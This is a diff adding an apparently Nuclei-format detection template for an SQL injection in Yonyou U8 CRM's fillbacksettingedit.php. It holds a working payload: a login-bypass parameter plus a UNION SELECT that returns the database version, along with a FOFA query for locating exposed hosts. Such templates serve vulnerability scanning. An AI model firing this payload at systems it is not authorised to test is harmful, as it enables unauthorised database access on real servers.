@@ -1,0 +1,31 @@
+id: yongyou-U8-CRM-fillbacksettingedit-sql
+
+info:
+  name: 用友U8 CRM fillbacksettingedit SQL注入漏洞
+  author: yongyou
+  severity: high
+  metadata: 
+    fofa-query: body="用友U8CRM"
+  tags: yongyon,u8,crm,sql
+
+
+http:
+  - raw:
+      - |
+        GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+      - type: status
+        status: 
+          - 200
+
+
+
